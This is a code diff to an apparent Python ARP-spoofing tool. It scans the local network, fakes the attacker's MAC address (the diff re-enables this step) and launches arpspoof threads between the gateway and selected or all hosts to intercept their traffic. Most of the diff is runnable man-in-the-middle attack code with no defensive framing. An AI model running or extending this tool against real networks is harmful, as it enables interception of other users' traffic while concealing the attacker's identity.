@@ -7,6 +7,7 @@ import sys
 import time
 from prettytable import PrettyTable
 from netaddr import IPAddress
+import scapy.all as scapy
 from scapy.all import ARP, Ether, srp
 import threading
 
@@ -58,6 +59,10 @@ def reset_mac():
         print(color.GREEN+"[+] "+line.split(':', 1)[0]+": "+color.YELLOW+line.split(':', 1)[1]+color.END)
     subprocess.run(['ifconfig', interface ,'up'], capture_output=True).stdout.decode()
     
+def NetworkManager():
+    print(color.BLUE+"[~] Restarting NetworkManager..."+color.END)
+    subprocess.run(['systemctl', 'start', 'NetworkManager'])
+    
 def get_gateway():
     global gateway
     gateways = netifaces.gateways()
@@ -108,7 +113,7 @@ def scan_network():
     result = srp(packet, timeout=3, verbose=0)[0]
 
     for s, x in result:
-        ip_dict.update({i: x.psrc})
+        ip_dict.update({i: [x.psrc, x.hwsrc]})
         net_table.add_row([str(i), str(x.psrc), str(x.hwsrc)])
         i+=1
         
@@ -119,13 +124,13 @@ def scan_network():
 
 # Get target IP
 def target():
-    global target_ip, choice_ip, all
-    print("[0] : "+"All")
-    print(color.GREEN+"[R] : "+"Rescan Network"+color.END)
-    print(color.RED+"[E] : "+"Exit"+color.END)
-    print(color.PURPLE+"\nChoose an IP to spoof, rescan or exit"+color.END)
+    global choice_ip, all
+    if len(ip_dict) > 0:
+        print("\n[0] : "+"All"+color.GREEN+"\n[R] : "+"Rescan Network"+color.PURPLE+"\n[M] : "+"Restore MAC Address and Scan Network"+color.RED+"\n[E] : "+"Exit"+color.CYAN+"\n\nChoose an IP to spoof, rescan or exit"+color.END)
+    else:
+        print(color.GREEN+"\n[R] : "+"Rescan Network"+color.PURPLE+"\n[M] : "+"Restore MAC Address and Scan Network"+color.RED+"\n[E] : "+"Exit"+color.CYAN+"\n\nIt looks like no hosts were found in the scanning session.\nYou can Rescan the network while maintaining a fake MAC address or restore your real MAC Address and Rescan the network."+color.END)
     choice_ip = ""
-    while not set(choice_ip.split(" ")).issubset({str(key) for key in ip_dict.keys()}) and choice_ip != "R" and choice_ip != "E" and choice_ip != "0":
+    while not set(choice_ip.split(" ")).issubset({str(key) for key in ip_dict.keys()}) and choice_ip != "R" and choice_ip != "E" and choice_ip != "0" and choice_ip != "M":
         choice_ip = input("Choice: ")
     if choice_ip == "E":
         reset_mac()
@@ -133,11 +138,17 @@ def target():
     elif choice_ip == "R":
         scan_network()
         target()
+    elif choice_ip == "M":
+        reset_mac()
+        NetworkManager()
+        time.sleep(5)
+        scan_network()
+        target()
     elif choice_ip == "0":
         all = True
     else:
         try:
-            target_ip = ip_dict[int(''.join(choice_ip)[0])]
+            ip_dict[int(''.join(choice_ip)[0])]
         except ValueError:
             reset_mac()
             sys.exit(color.RED+"[-] An error has occured\n Exiting..."+color.END)
@@ -153,6 +164,7 @@ def redirect():
 def arpspoof(ip1,ip2,pos):
     subprocess.run(['xterm', '-geometry', '110x24'+str(pos)+'0+0', '-hold', '-e', 'arpspoof', '-t', ip1, ip2, '-i', interface])
 
+# Attack thread
 def attck_thread():
     global J
     threads = []
@@ -161,8 +173,8 @@ def attck_thread():
     if all:
         if len(ip_dict) > 0:
             for w in ip_dict:
-                t1 = threading.Thread(target=arpspoof, args=(gateway, ip_dict[w], '+',))
-                t2 = threading.Thread(target=arpspoof, args=(ip_dict[w], gateway, '-',))
+                t1 = threading.Thread(target=arpspoof, args=(gateway, ip_dict[w][0], '+',))
+                t2 = threading.Thread(target=arpspoof, args=(ip_dict[w][0], gateway, '-',))
                 threads.append(t1)
                 threads.append(t2)
             for i in threads:
@@ -175,8 +187,8 @@ def attck_thread():
             sys.exit(color.RED+"Exiting..."+color.END)
     else:
         for i in choice_ip.split():
-            t1 = threading.Thread(target=arpspoof, args=(gateway, ip_dict[int(i)], '+',))
-            t2 = threading.Thread(target=arpspoof, args=(ip_dict[int(i)], gateway, '-',))
+            t1 = threading.Thread(target=arpspoof, args=(gateway, ip_dict[int(i)][0], '+',))
+            t2 = threading.Thread(target=arpspoof, args=(ip_dict[int(i)][0], gateway, '-',))
             threads.append(t1)
             threads.append(t2)
         for i in threads:
@@ -225,13 +237,11 @@ try:
     get_gateway()
     get_netmask()
     get_ssid()
-    # change_mac()
+    change_mac()
     time.sleep(5)
     scan_network()
     target()
-    
     redirect()
-
     attck_thread()
     
     print(color.GREEN+"[+] Job Done...\n"+color.END)
